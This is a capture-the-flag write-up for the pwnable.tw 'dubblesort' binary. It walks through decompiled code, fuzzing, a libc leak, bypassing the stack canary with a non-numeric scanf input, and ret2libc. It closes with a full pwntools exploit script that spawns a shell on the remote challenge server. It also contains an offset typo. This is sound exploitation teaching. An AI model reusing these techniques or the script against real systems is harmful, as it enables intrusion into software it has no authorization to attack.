# dubblesort

file:
```
dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped
```

checksec:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     1               2       dubblesort
```

## solution

The program takes an input from stdin then prints it, then prompts input for some numbers and sorts them which makes sense given the name of the challenge. also as we're given a `libc_32.so.6` we can assume the solution requires a ret2libc.

Lets open it up in ghidra and clean it up


```cpp
int main(void)

{
  int canary_ret;
  uint num_check;
  undefined4 *num_temp;
  int in_GS_OFFSET;
  uint count;
  undefined4 num [8];
  undefined buf [64];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  set_buf();
  __printf_chk(1,"What your name :");
  read(0,buf,0x40);
  __printf_chk(1,"Hello %s,How many numbers do you what to sort :",buf);
  __isoc99_scanf(&DAT_00010bfa,&count);
  if (count != 0) {
    num_temp = num;
    num_check = 0;
    do {
      __printf_chk(1,"Enter the %d number : ",num_check);
      fflush(stdout);
      __isoc99_scanf(&DAT_00010bfa,num_temp);
      num_check = num_check + 1;
      num_temp = num_temp + 1;
    } while (num_check < count);
  }
  sort(num,count);
  puts("Result :");
  if (count != 0) {
    num_check = 0;
    do {
      __printf_chk(1,&DAT_00010c1d,num[num_check]);
      num_check = num_check + 1;
    } while (num_check < count);
  }
  canary_ret = 0;
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
    canary_ret = canary_check();
  }
  return canary_ret;
}
```


lets fuzz it and see if it breaks.

```
What your name :aaa
Hello aaa
$���,How many numbers do you what to sort :0
Processing......
[1]    23693 segmentation fault  ./dubblesort
```

```
What your name :aa
Hello aa
�$���,How many numbers do you what to sort :10
Enter the 0 number : 1
Enter the 1 number : 1
Enter the 2 number : 1
Enter the 3 number : 1
Enter the 4 number : 1
Enter the 5 number : 1
Enter the 6 number : 1
Enter the 7 number : 1
Enter the 8 number : 1
Enter the 9 number : +
Processing......
Result :
1 1 1 1 1 1 1 1 1 4159353380 % 
```

```
What your name :AAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAA
������,How many numbers do you what to sort :30
Enter the 0 number : 1
Enter the 1 number : 1
Enter the 2 number : 1
Enter the 3 number : 1
Enter the 4 number : 1
Enter the 5 number : 1
Enter the 6 number : 1
Enter the 7 number : 1
Enter the 8 number : 
1
Enter the 9 number : 1
Enter the 10 number : 1
Enter the 11 number : 1
Enter the 12 number : 1
Enter the 13 number : 1
Enter the 14 number : 1
Enter the 15 number : 1
Enter the 16 number : 
1
Enter the 17 number : 1
Enter the 18 number : 1
Enter the 19 number : 1
Enter the 20 number : 1
Enter the 21 number : 1
Enter the 22 number : 1
Enter the 23 number : 1
Enter the 24 number : 1
Enter the 25 number : 1
Enter the 26 number : 1
Enter the 27 number : 1
Enter the 28 number : 1
Enter the 29 number : 1
Processing......
1
1
Result :
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 *** stack smashing detected ***: terminated
[1]    23755 abort      ./dubblesort
```

funky. it appears to be filling the unsorted array and then overflowing. given what we know there are a few things:

* we need to leak libc base address in order to use the ret2libc
* we need to bypass the stack canary

I guess it continues printing until it hits a random null character, which is why there is garbage when it prints. we can use this to leak as it will print the string entered and the values on the stack until a terminating character is reached.

First we can look into leaking the canary since that seems straight forward. Looking in ghidra, the difference between the canary (`0x14`) and the number input (`0x74`) is `0x60`, divided by 4 yields 24 numbers. So we need to enter 24 numbers before we can leak the canary using the a non-number input shown above.

Onto the ret2libc.

If we set a breakpoint at the second `__printf__chk` and check the stack, we can see that afte the user input of `AAAA` the address of libc is leaked on the stack. (TODO insert screenshot because colors). `vmmap` can show the addresses and taking the diff yields `001eb000`.

`readelf -S /usr/lib/i386-linux-gnu/libc-2.31.so` shows that this offset corresponds to the `.got.plt` section. given that we should be using the given libc, we just look where that `.got.plt` section is to find the offset required for the challenge. turns out that its `001b000a`. So the math is

`libc_base_address = leaked_address - 001b000a`


We dont need to find the symbols/text in libc manually since pwntools can do it. but just for kicks lets find `system` and `/bin/sh`

```
readelf -s libc_32.so.6 | grep system
   245: 00110690    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
rabin2 -z libc_32.so.6 | grep "/bin/sh"
704  0x00158e8b 0x00158e8b 7   8    .rodata                                           ascii   /bin/sh

```

so

```
system = libc_base + 0x3a940
binsh = libc_base + 0x15e8b
```


anyway heres the final script

```py
#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10101)
    else:
        p = elf.process()

context(os="linux") 
context.binary = elf = ELF("./dubblesort")
context.log_level = "debug"
start()

libc = ELF("./libc_32.so.6")

p.sendlineafter(b"What your name :", b"A"*24)
p.recvuntil(b"A" * 24)

libc_base = u32(p.recv(4)) - 0x1b000a
print(hex(libc_base))

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

# we need to send 24 chars + funky char + system + bin_sh
length = 24 + 1 + 9 + 1

p.sendlineafter(b"to sort :", str(length))

for _ in range(24):
    p.sendlineafter(b"number : ", b"1")

# for stack canary
p.sendline(b"+")

for _ in range(9):
    p.sendlineafter(b"number : ", str(system))

p.sendlineafter(b"number : ", str(bin_sh))
p.interactive()
```